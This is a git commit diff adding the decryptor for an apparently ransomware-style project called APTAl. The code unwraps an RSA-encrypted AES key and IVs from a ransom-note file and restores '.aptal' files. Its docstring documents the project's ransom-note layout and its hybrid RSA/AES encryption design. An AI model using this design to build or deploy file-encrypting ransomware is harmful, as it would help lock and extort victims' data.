ac9f58ea7200f8ab4bb8c2b3cdf1ff6d9d11bc11
HaaaToka <okanalan97.14@gmail.com>
2020-11-03 17:08:16 -0500

    Decryptor :: release v1

--- main.py
+++ main.py
@@ -13,14 +13,25 @@ def aboutAPTAl():
 
 def openthelock():
     """
-        TODO Explain Function
+        IVs, AES key and file paths are encrypted by RSA public key after file encrypted by AES.
+        This function decrypt the encrypted information.
+
+        HEYY_APTAl_READ_ME.txt schema
+            info about us
+            base64(RSA(aes key))
+            base64(RSA(iv_1)):::::base64(RSA(file_1))
+            .
+            .
+            .
+            base64(RSA(iv_n)):::::base64(RSA(file_n))
+
     """
-    print("Begin to DECRYPT the Encrypted IVs")
+    print("Begin to DECRYPT the keys")
 
     rsa_private_key = open(Utils.rsa_private_key_path,"rb").read()
     rsa_cipher = RSACipher(rsa_private_key)
 
-    # TODO -> determine the line 
+    # passing the introduction section
     pass_the_introduction = 1 #Utils.who_we_are
     pass_the_introduction += len(Utils.what_is_my_purpose.split("\n"))-2
     
@@ -28,63 +39,65 @@ def openthelock():
         
         for i in range(pass_the_introduction):
             _temp = ivs_file.readline()
-            #  print(">>>>",_temp)
 
         with open(Utils.dec_aesIV_file_store_path,"wb") as dec_ivs_file:
 
-            aes_key = ivs_file.readline().strip()
-            # print("base64(aes(Key)):",aes_key,"Will decrypt")
-            aes_key = base64.b64decode(aes_key)
-            # print("(aes(Key):",aes_key,"will decrypt")
-            aes_key = rsa_cipher.decrypt(aes_key)
-            # print("AES_key:", aes_key)
-            # dec_ivs_file.write(aes_key)
             # decrypt aes key
-
+            aes_key = ivs_file.readline().strip()
+            aes_key = base64.b64decode(aes_key)
+            aes_key = rsa_cipher.decrypt(aes_key)
+            dec_ivs_file.write(aes_key+b"\n")
+            
+            # Decrypt iv and path with given RSA private key than write the decrypted pairs to Utils.dec_aesIV_file_store_path
             for line in ivs_file.readlines():
-                iv, which_file = line.strip().split(b":::::")
-                # print("\tBASE64(rsa(IV)):",iv,":::",which_file,"will decrypt")
+                iv, which_file = line.strip().split(b":::::")       
                 iv = rsa_cipher.decrypt(base64.b64decode(iv.decode()))
                 which_file = rsa_cipher.decrypt(base64.b64decode(which_file.decode("utf-8")))
-                # print("\trsa(IV):",iv,":::",which_file,"will decrypt")
                 dec_ivs_file.write(iv+b":::::"+which_file+b"\n")
-                # Decrypt iv and path with given RSA private key than write thedecrypted pairs to Utils.dec_aesIV_file_store_path
 
-def decryptFile(cipher,iv,file_path):
-    decrypted_file_path = file_path[:-6]
+def decryptFile(aes_cipher,iv,file_path):
+    """
+        Decryption of files which are encrypted with AES is done here
+
+        aes_cipher: our AES decryptor object
+        iv: the initial vector(iv) which is used to encrypt the file
+        file_path: which file will decrypt
+    """
+    encrypted_file_path = file_path+b".aptal"
     chunk_size = 16*1024
-    with open(file_path, 'rb') as infile:
-        with open(decrypted_file_path, 'wb') as outfile:
+    with open(encrypted_file_path, 'rb') as infile:
+        with open(file_path, 'wb') as outfile:
             while True:
                 chunk = infile.read(chunk_size)
                 if len(chunk) == 0:
                     break
-                outfile.write(cipher.decrypt(iv, chunk))
-    
-    # os.remove(file_path) # deleting .aptal file
+                outfile.write(aes_cipher.decrypt(iv, chunk))
+    # deleting .aptal file
+    os.remove(encrypted_file_path) 
 
 def startRescueFiles():
     """
-        TODO Explain Function
+        Reading IVs and file paths from decrypted_iv_file.txt which is a form of decrypted HEYY_APTAl_READ_ME.txt file
     """
     print("Begin to DECRYPT the Files")
 
     with open(Utils.dec_aesIV_file_store_path,"rb") as ivs_file:
 
+        # read aes key
         aes_key = ivs_file.readline().strip()
-        cipher = AESCipher(aes_key)
+        aes_cipher = AESCipher(aes_key)
 
+        # read the file line by line then decrypt them one by one
         for line in ivs_file.readlines():
             iv, which_file = line.strip().split(b":::::")
-            print(iv,which_file)
-            decryptFile(cipher,iv,which_file)
-            # Decrypt the encrypted files
+            decryptFile(aes_cipher,iv,which_file)
+
 
 def main():
     
     aboutAPTAl()
     openthelock()
-    #startRescueFiles()
+    startRescueFiles()
 
 
 if __name__ == "__main__":
